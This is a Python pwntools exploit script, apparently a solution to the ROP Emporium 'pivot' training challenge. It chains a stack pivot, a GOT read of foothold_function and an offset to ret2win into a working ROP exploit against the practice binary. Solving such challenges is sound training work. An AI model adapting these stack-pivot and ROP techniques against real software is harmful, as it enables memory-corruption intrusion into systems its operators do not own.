import binascii
from pwn import ELF, p64, u64, cyclic, process


lib = ELF('./libpivot.so')
binary = ELF('./pivot')

io = process('./pivot')

PROCESS = './pivot'
io = process(PROCESS)


pop_rax_ret = p64(0x004009bb)       # pop rax; ret;
xchg_rax_rsp_ret = p64(0x004009bd)  # xchg rax, rsp; ret;
mov_rax_mrax = p64(0x004009c0)      # mov rax, qword [rax]; ret;
add_rax_rbp = p64(0x004009c4)       # add rax, rbp; ret;
pop_rbp_ret = p64(0x00400829)       # pop rbp; ret;
call_rax = p64(0x004006b0)          # call rax; ret;

io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
raw_pivot_addr = io.recvline().strip().rjust(16, b"0")
pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='big')
print(f"stack pivot at: {hex(pivot_addr)}")

offset = 40
padding = cyclic(40)
smash_stack = b"".join([
    padding,
    pop_rax_ret,
    p64(pivot_addr),
    xchg_rax_rsp_ret
])

print(smash_stack)

ret2win_offset = p64(lib.sym['ret2win'] - lib.sym['foothold_function'])

foothold_func_plt = p64(io.elf.plt['foothold_function'])  # 0x400720
foothold_func_got = p64(io.elf.got['foothold_function'])  # 0x601040

print(f"foothold plt: {hex(io.elf.plt['foothold_function'])}")
print(f"foothold got: {hex(io.elf.got['foothold_function'])}")

print(f"ret2win offset is: {ret2win_offset}")

rop_chain = b"".join([
    foothold_func_plt,
    pop_rax_ret,
    foothold_func_got,
    pop_rbp_ret,
    ret2win_offset,
    mov_rax_mrax,
    add_rax_rbp,
    call_rax
])

print(rop_chain)

io.send(rop_chain)

io.recvuntil(b'Now please send your stack smash')

io.send(smash_stack)
io.interactive()

